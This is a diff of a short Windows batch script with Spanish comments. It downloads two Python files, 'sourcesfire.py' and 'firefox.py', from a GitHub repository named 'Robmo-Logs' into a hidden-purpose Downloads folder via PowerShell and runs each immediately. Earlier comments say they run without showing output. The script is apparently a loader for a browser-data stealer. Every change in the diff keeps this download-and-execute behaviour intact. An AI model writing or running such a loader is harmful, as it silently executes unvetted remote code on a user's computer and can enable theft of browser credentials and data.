@@ -1,37 +1,31 @@
 @echo off
 
 :: Ruta de descarga y nombre del archivo
-set "url1=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/sourcesfire.py"
-set "url2=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/firefox.py"
+set "url_sourcesfire=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/sourcesfire.py"
+set "url_firefox=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/firefox.py"
 set "download_folder=C:\Users\%USERNAME%\Downloads\ROBMO"
-set "filename1=sourcesfire.py"
-set "filename2=firefox.py"
+set "filename_sourcesfire=sourcesfire.py"
+set "filename_firefox=firefox.py"
 
-:: Nombre de los archivos Python a ejecutar
-set "python_script1=%download_folder%\%filename1%"
-set "python_script2=%download_folder%\%filename2%"
+:: Nombre del archivo Python a ejecutar
+set "python_script_sourcesfire=%download_folder%\%filename_sourcesfire%"
+set "python_script_firefox=%download_folder%\%filename_firefox%"
 
 :: Comprueba si la carpeta de descarga existe, y si no, créala
 if not exist "%download_folder%" (
     mkdir "%download_folder%"
 )
 
-:: Descarga el primer archivo desde la URL
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url1%', '%python_script1%')"
-
-:: Comprueba si la descarga del primer archivo fue exitosa
-if exist "%python_script1%" (
-    :: Ejecuta el primer archivo Python sin mostrar salida
-    python "%python_script1%"
+:: Descarga y ejecuta sourcesfire.py desde la URL
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url_sourcesfire%', '%python_script_sourcesfire%')"
+if exist "%python_script_sourcesfire%" (
+    python "%python_script_sourcesfire%"
 )
 
-:: Descarga el segundo archivo desde la URL
-powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url2%', '%python_script2%')"
-
-:: Comprueba si la descarga del segundo archivo fue exitosa
-if exist "%python_script2%" (
-    :: Ejecuta el segundo archivo Python sin mostrar salida
-    python "%python_script2%"
+:: Descarga y ejecuta firefox.py desde la URL
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url_firefox%', '%python_script_firefox%')"
+if exist "%python_script_firefox%" (
+    python "%python_script_firefox%"
 )
 
 exit
